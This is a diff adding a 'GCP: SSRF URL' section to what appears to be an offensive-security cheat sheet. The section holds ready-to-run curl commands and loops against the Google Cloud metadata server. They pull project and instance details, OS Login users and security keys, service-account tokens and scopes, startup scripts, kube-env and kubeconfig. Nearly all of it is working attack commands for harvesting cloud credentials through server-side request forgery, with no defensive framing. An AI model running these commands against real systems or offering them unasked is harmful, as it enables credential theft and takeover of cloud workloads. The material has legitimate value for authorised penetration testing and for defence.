@@ -714,6 +714,89 @@ except Exception as e:
     print(f"Error: {e}")
 ```
 
+## GCP:
+
+SSRF URL:
+
+```sh
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+# Project attributes
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true
+
+# /oslogin
+# users
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
+# groups
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
+# security-keys
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
+# authorize
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize
+
+# /instance
+# Description
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
+# Hostname
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Image
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
+# Machine Type
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
+# Name
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
+# Tags
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# User data
+curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
+# Network Interfaces
+for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do 
+    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
+    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
+    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
+    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
+    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
+    echo "  ==============  "
+done
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do 
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+# K8s Attributtes
+## Cluster location
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
+## Cluster name
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
+## Os-login enabled
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
+## Kube-env
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
+## Kube-labels
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
+## Kubeconfig
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig
+
+# All custom project attributes
+curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+
+# All custom project attributes instance attributes
+curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+```
+
 ## Kubernetes Secrets Harvesting:
 
 ```bash
